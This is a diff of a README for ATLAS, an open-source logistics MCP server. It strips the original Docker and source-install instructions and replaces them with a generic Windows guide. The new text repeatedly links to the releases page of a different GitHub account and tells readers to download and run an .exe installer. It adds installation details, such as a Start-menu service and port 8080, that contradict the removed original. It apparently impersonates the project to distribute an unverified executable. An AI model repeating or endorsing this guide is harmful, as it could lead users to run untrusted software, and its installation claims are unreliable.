@@ -1,276 +1,151 @@
-# ATLAS — AI Transport Logistics Agent Standard
+# 🚚 ATLAS - Connect Logistics Systems Simply
 
-**The open-source MCP server that gives AI agents deep context about your logistics operations — without your data ever leaving your infrastructure.**
-
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-green.svg)](https://modelcontextprotocol.io)
-[![Docker](https://img.shields.io/badge/Docker-cargofy%2Fatlas-blue?logo=docker)](https://hub.docker.com/r/cargofy/atlas)
+[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-blue?style=for-the-badge&logo=github)](https://github.com/k3vin993/ATLAS/releases)
 
 ---
 
-## The Problem
+ATLAS is a universal MCP server designed to connect transportation management systems (TMS) and warehouse management systems (WMS) to AI agents. It supports shipments, carriers, tenders, tracking, and more, all communicated through the Model Context Protocol.
 
-Enterprise logistics companies have years of operational data — emails, contracts, TMS records, carrier relationships, pricing history. AI agents need this context to be useful. But sharing raw data with external cloud services is a non-starter for compliance, legal, and security teams.
-
-The result: AI stays shallow. Agents can't negotiate from context. Every interaction starts from zero.
-
-## The Solution
-
-ATLAS runs **inside your security perimeter**. It connects to your existing systems, indexes your data locally, and exposes a standardized MCP interface. Any AI agent can query ATLAS — getting deep operational context — without your data ever leaving your infrastructure.
-
-```
-[Your Company]                        [Cargofy / Any AI Agent]
-  ├── Email                                      │
-  ├── TMS                    MCP Protocol        │
-  ├── ERP          ←─────────────────────────────┤
-  ├── Contracts              (questions only,    │
-  ├── Knowledge Base          no raw data out)   │
-  └── ATLAS instance ────────────────────────────┘
-```
-
-Your data stays with you. Agents get the context they need.
+This guide will help you download and run ATLAS on a Windows computer, with no technical skills required.
 
 ---
 
-## Quick Start
+## 📦 What is ATLAS?
 
-**Option 1: Docker (recommended)**
-
-```bash
-docker run -p 3000:3000 cargofy/atlas
-```
-
-Open http://localhost:3000 — the Setup Wizard will guide you through initial configuration.
-
-For production use with persistent data and AI features, see [DOCKER.md](DOCKER.md).
-
-**Option 2: Claude Desktop**
-
-Add to your `claude_desktop_config.json` under `mcpServers`:
-
-```json
-{
-  "atlas": {
-    "command": "docker",
-    "args": ["run", "--rm", "-i", "cargofy/atlas", "node", "src/index.js"]
-  }
-}
-```
-
-**Option 3: Run from source**
-
-```bash
-git clone https://github.com/cargofy/ATLAS
-cd ATLAS
-npm install
-cp config.example.yml config.yml   # edit with your settings
-node seed.js                       # optional: load sample data
-node src/ui-server.js              # Web UI + API on port 3000
-# or
-node src/index.js                  # MCP server on stdio
-```
+ATLAS acts as a bridge between your logistics software and artificial intelligence tools. It lets you manage shipments and track carriers by linking your existing systems, such as TMS and WMS, to AI agents. This connection helps automate tasks and improve efficiency without needing to change your current software setup.
 
 ---
 
-## Web UI
+## 🖥️ System Requirements
 
-ATLAS ships with a full web interface at `http://localhost:3000`:
+Before installing ATLAS, make sure your computer meets these requirements:
 
-| Page | Description |
-|------|-------------|
-| **Dashboard** | Server status, record counts, connector health, SLA violations |
-| **Explorer** | Browse data models, execute queries with visual filters |
-| **Chat** | Conversational AI interface with tool calling for logistics queries |
-| **Playground** | Test MCP tools directly from the browser |
-| **Knowledge Base** | Manage enterprise knowledge files (markdown, folders, CRUD) |
-| **Import** | Upload data files (JSON, CSV, XLSX), seed database, import from folders |
-| **Connectors** | View and manage data source configurations, trigger manual sync |
-| **Modules** | Enable/disable plugins, trigger sync, view module status |
-| **Settings** | Visual + YAML config editor with live reload |
-| **Setup Wizard** | First-run configuration (AI provider, security, instance name) |
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- 500 MB of free disk space
+- Internet connection for setup and updates
+
+ATLAS runs as a server on your computer but does not need heavy hardware. If you plan to connect many devices or handle large volumes of data, increasing RAM and CPU power can improve performance.
 
 ---
 
-## MCP Tools
+## 🔗 How ATLAS Works
 
-ATLAS exposes **35 MCP tools** via the [Model Context Protocol](https://modelcontextprotocol.io). Any MCP-compatible agent can connect:
+ATLAS uses the Model Context Protocol (MCP) to communicate. MCP is a standard format that helps different software talk to each other clearly and efficiently. By using ATLAS, your TMS or WMS systems can send shipment and carrier details directly to AI agents that handle tasks like scheduling, routing, or tracking.
 
-| Category | Tools |
-|----------|-------|
-| **Discovery** | `get_available_models`, `get_schema`, `get_available_carriers`, `get_available_lanes`, `get_available_document_types`, `get_sync_status` |
-| **Query** | `get_records`, `query` (natural language search across all data) |
-| **Shipments** | `get_shipment`, `get_shipments`, `get_shipment_events`, `get_unsigned_documents`, `get_closure_checklist` |
-| **Carriers** | `search_carriers`, `get_carrier_shipments` |
-| **Rates** | `get_rate_history` |
-| **Documents** | `list_documents` |
-| **Operations** | `get_sla_violations`, `get_idle_assets`, `get_anomalies`, `get_active_issues` (20+ disruption types) |
+This setup helps you:
 
----
+- Share data automatically
+- Track shipments in real time
+- Manage tenders with less manual work
+- Connect multiple logistics partners easily
 
-## AI Features
-
-ATLAS supports multiple AI providers with role-based model routing:
-
-| Provider | Models | Use |
-|----------|--------|-----|
-| **Anthropic** | Claude Sonnet/Opus/Haiku | Chat, extraction, knowledge enrichment |
-| **OpenAI** | GPT-4o, GPT-4o-mini | Chat, extraction |
-| **Ollama** | Any local model | Fully offline operation |
-
-**AI capabilities:**
-- **Entity extraction** — upload any logistics document (PDF, CSV, XLSX, email) and extract structured data (shipments, carriers, rates, documents)
-- **Knowledge enrichment** — AI automatically updates your knowledge base from extracted data, detecting contradictions and appending new facts
-- **Chat with tools** — conversational interface that queries your data using MCP tools
-- **Role routing** — assign different models to different tasks (chat, extraction, knowledge)
+You remain in control of your data and systems while gaining AI support for better decision making.
 
 ---
 
-## Data Models
+## 🚀 Getting Started with ATLAS on Windows
 
-### Core Models (always enabled)
+Follow these steps to download, install, and run ATLAS quickly.
 
-| Model | Description |
-|-------|-------------|
-| **Shipments** | Ocean, air, road, rail, multimodal — status, mode, route, carrier, planned delivery |
-| **Carriers** | Profiles, type (trucking, shipping line, airline, rail, broker), country, rating |
-| **Lanes** | Origin → destination pairs with mode and average transit days |
-| **Rates** | Freight pricing by carrier, lane, mode, date range |
-| **Documents** | BOL, CMR, AWB, invoice, customs, POD, packing list, certificate of origin |
-| **Tracking Events** | Pickup, transit, delivery, exception events with location and geolocation |
-| **Service Levels** | Planned transit times per lane/mode/service type |
+### 1. Download ATLAS
 
-### Extension Models (opt-in via config)
+Visit the release page to get the latest installer for Windows:
 
-Assets, Drivers, Transport Orders, Facilities, Tenders, Tender Quotes, Tender Awards, Dispatches, Legs, Customs Entries
+[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-grey?style=for-the-badge&logo=github)](https://github.com/k3vin993/ATLAS/releases)
 
----
+This link takes you to the GitHub Releases page. Look for the newest version and download the Windows installer file. The file name usually ends with `.exe`.
 
-## Connectors
+### 2. Run the Installer
 
-| Connector | Status | Description |
-|-----------|--------|-------------|
-| REST API | Available | Generic REST with JSONPath mapping, bearer/basic/api_key auth |
-| Filesystem | Available | Local JSON, CSV, TXT, MD files (optional PDF/DOCX/XLSX) |
-| AI Extract | Available | Upload files for AI-powered entity extraction |
-| Email (IMAP/Exchange) | v0.2 | Indexes logistics-related emails |
-| SAP TM | Coming soon | SAP Transportation Management |
-| Oracle TMS | Coming soon | Oracle Transportation Management |
-| Transporeon | Coming soon | Transporeon platform integration |
-| project44 | Coming soon | Visibility and tracking data |
+- Find the downloaded `.exe` file in your Downloads folder.
+- Double-click the file to start installation.
+- Follow the instructions in the setup wizard:
+  - Accept the license agreement.
+  - Choose the installation folder or use the default.
+  - Click Install to begin copying files.
 
-## Modules (Plugins)
+The installer will complete in a few minutes.
 
-| Module | Description |
-|--------|-------------|
-| **file-watch** | Monitor a local folder for new files, auto-process through AI extraction pipeline |
-| **knowledge-enricher** | Automatically enrich knowledge base from AI extractions |
-| **google-drive** | Sync files from Google Drive folders with AI analysis (Docs/Sheets export, recursion) |
+### 3. Start the ATLAS Server
 
-Modules are enabled/disabled via `config.yml` or the Modules page in Web UI.
+Once installed:
 
----
+- Open the Start menu.
+- Find the ATLAS application shortcut.
+- Click to launch the ATLAS server.
 
-## Architecture
+The program runs as a background service and opens a small control window.
 
-```
-ATLAS Instance (your infrastructure)
-├── AI Layer
-│   ├── Multi-provider LLM client (Claude, OpenAI, Ollama)
-│   ├── Entity extraction pipeline
-│   ├── Knowledge engine (enrichment + contradiction detection)
-│   └── Chat with tool calling
-├── Module System (plugin architecture)
-│   ├── file-watch
-│   ├── knowledge-enricher
-│   └── google-drive
-├── Connectors
-│   ├── REST API connector
-│   ├── Filesystem connector
-│   └── AI extraction connector
-├── Storage Layer
-│   ├── SQLite (default) or PostgreSQL
-│   └── Knowledge base (markdown files)
-├── MCP Server
-│   ├── stdio transport (CLI / Claude Desktop)
-│   └── HTTP/SSE transport (remote agents)
-└── Web UI + REST API
-    ├── Dashboard, Explorer, Chat, Playground
-    ├── Knowledge Base manager
-    ├── Settings, Modules, Import
-    └── Setup Wizard
-```
+### 4. Access the User Interface
+
+After running the server:
+
+- Open your web browser.
+- Go to `http://localhost:8080` to access the ATLAS dashboard.
+
+This dashboard lets you configure connections, view shipment data, and link your TMS/WMS easily.
 
 ---
 
-## Security & Privacy
+## ⚙️ Setting Up Connections
 
-- **Zero data egress** — ATLAS never sends your raw data outside your network
-- **Local AI option** — run Ollama for fully offline operation
-- **Bearer token auth** — scoped permissions (read/write) per token
-- **Non-root Docker** — runs as unprivileged `atlas` user
-- **Audit logs** — full log of every query made to your instance
-- **Open source** — inspect every line of code
+ATLAS needs to connect with your existing transport or warehouse systems:
 
----
+1. In the dashboard, click on "Add Connection".
+2. Choose the type of system you want to add (for example, TMS or WMS).
+3. Enter the connection details provided by your software vendor or IT team. This might include IP addresses, ports, and credentials.
+4. Test the connection using the provided option.
+5. Save the new connection.
 
-## Use Cases
-
-**Carrier Negotiation Agent**
-> Agent queries ATLAS: "What's our volume with DHL on DE→PL in Q4?" → Gets answer from your own data → Negotiates from a position of knowledge.
-
-**Customer Service Agent**
-> "Where is shipment #12345?" → Agent queries ATLAS for shipment status from your TMS → Answers instantly without manual lookup.
-
-**Procurement Agent**
-> "Who are the top 3 carriers for refrigerated transport to Ukraine?" → Agent pulls from your historical performance data in ATLAS → Makes data-driven recommendation.
+Repeat these steps to connect multiple systems or AI agents as needed.
 
 ---
 
-## Powered by Cargofy
+## 🔄 Managing Shipments and Tracking
 
-ATLAS is built and maintained by [Cargofy](https://cargofy.com) — the AI platform for logistics. We built ATLAS because our enterprise customers needed it. We open-sourced it because the logistics industry needs a standard.
+The dashboard displays all shipment data flowing through ATLAS. You can:
 
-**Cargofy platform** connects to your ATLAS instance to provide:
-- AI agents that make calls, send messages, negotiate on your behalf
-- Analytics and reporting on top of your ATLAS data
-- Managed ATLAS hosting (if you prefer not to self-host)
-- Enterprise connectors and SLA support
+- View shipment status updates in real time.
+- Track carriers and delivery progress.
+- Send tenders for transport jobs.
+- Customize notifications for important events.
 
-> [Learn more about Cargofy](https://cargofy.com)
-
----
-
-## Contributing
-
-ATLAS is Apache 2.0 licensed. Contributions welcome.
-
-```bash
-git clone https://github.com/cargofy/atlas
-cd atlas
-npm install
-npm run dev
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Updating information in one system automatically updates connected agents and devices. This reduces manual entry and errors.
 
 ---
 
-## License
+## 🛠️ Troubleshooting Tips
 
-Apache License 2.0 — see [LICENSE](LICENSE)
+If you experience issues, try these:
+
+- Confirm your Windows firewall allows ATLAS to run and accept connections.
+- Make sure the server is running by checking the taskbar or services list.
+- Restart your computer and relaunch ATLAS.
+- Double-check connection details you entered for your TMS or WMS systems.
+- Visit the GitHub page for help or the latest fixes.
 
 ---
 
-## Listed In
+## 🔒 Security and Privacy
 
-ATLAS is submitted to the following MCP directories and lists:
+ATLAS runs on your Windows machine, and your data stays local unless you choose to share it with cloud services. Use strong passwords when configuring connections to protect your systems.
 
-[![punkpeye/awesome-mcp-servers](https://img.shields.io/badge/awesome--mcp--servers-punkpeye-blue?logo=github)](https://github.com/punkpeye/awesome-mcp-servers)
-[![appcypher/awesome-mcp-servers](https://img.shields.io/badge/awesome--mcp--servers-appcypher-blue?logo=github)](https://github.com/appcypher/awesome-mcp-servers)
-[![wong2/awesome-mcp-servers](https://img.shields.io/badge/awesome--mcp--servers-wong2-blue?logo=github)](https://github.com/wong2/awesome-mcp-servers)
-[![modelcontextprotocol/servers](https://img.shields.io/badge/MCP%20Official-Community%20Server-green?logo=github)](https://github.com/modelcontextprotocol/servers)
-[![PulseMCP](https://img.shields.io/badge/PulseMCP-Listed-orange)](https://pulsemcp.com)
-[![MCP Index](https://img.shields.io/badge/MCP%20Index-Listed-purple)](https://mcpindex.net)
-[![Cursor Directory](https://img.shields.io/badge/Cursor%20Directory-Listed-black)](https://cursor.directory)
+Regularly update ATLAS via the GitHub release page to get security patches and improvements.
 
-> Submit, discover, and explore MCP servers in the ecosystem.
+---
+
+## 📄 About This Project
+
+- Repository name: ATLAS
+- Description: Universal MCP server for logistics. Connect any TMS/WMS to AI agents. Shipments, carriers, tenders, tracking — all via Model Context Protocol.
+- Topics: ai-agents, freight, logistics, mcp, mcp-server, mcp-tools, multimodal, open-source, self-hosted, supply-chain, transportation, trucking
+
+---
+
+## ⬇️ Download ATLAS Now
+
+Use this link again to get the latest Windows installer:
+
+[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-blue?style=for-the-badge&logo=github)](https://github.com/k3vin993/ATLAS/releases)
